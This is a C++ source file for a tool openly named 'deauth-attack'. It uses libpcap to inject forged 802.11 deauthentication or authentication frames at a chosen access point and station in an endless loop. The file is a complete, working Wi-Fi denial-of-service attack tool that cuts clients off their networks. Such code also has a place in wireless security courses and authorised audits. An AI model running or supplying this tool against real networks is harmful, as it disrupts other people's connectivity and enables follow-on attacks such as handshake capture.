#include "proto_structures.h"
#include <iostream>
#include <pcap.h>
#include <unistd.h>
using std::cout;
using std::endl;
uint8_t deauth[0x32]={
	0x00,0x00,0x18,0x00,0x2e,0x40,0x00,0xa0, 0x20,0x08,0x00,0x00,0x00,0x02,0x85,0x09,
	0xa0,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0xc0,0x00,0x3a,0x01,0xff,0xff,0xff,0xff,
	0xff,0xff,0x99,0x00,0x00,0x00,0x00,0x00, 0x99,0x00,0x00,0x00,0x00,0x00,0x50,0xae,
	0x01,0x00
};
pcap_t* handle;
mac_addr ap;
mac_addr station;
bool auth;

int main(int c,char**v){
	if(c<3||c>5){
		cout<<"usage : deauth-attack <interface> <ap mac> [<station mac> [-auth]]"<<endl;
		exit(1);
	}
	auth=c==5;
	ap=v[2];
	if(c>3)station=v[3];
	char errbuf[PCAP_ERRBUF_SIZE];
	handle=pcap_open_live(v[1],BUFSIZ,1,1,errbuf);
	if(handle==nullptr){
		cout<<"pcap : "<<errbuf<<endl;
		exit(1);
	}
	if(auth){
		deauth[0x18]=0xb0;
		memcpy(deauth+0x1c,&ap,6);
		memcpy(deauth+0x22,&station,6);
		memcpy(deauth+0x28,&ap,6);
	}
	else{
		memcpy(deauth+0x22,&ap,6);
		memcpy(deauth+0x28,&ap,6);
		if(c>3)memcpy(deauth+0x1c,&station,6);
	}
	for(;;){
		if(pcap_sendpacket(handle,deauth,sizeof deauth)){
			cout<<"pcap_sendpacket"<<endl;
			exit(1);
		}
		usleep(100000);
	}
	return 0;
}
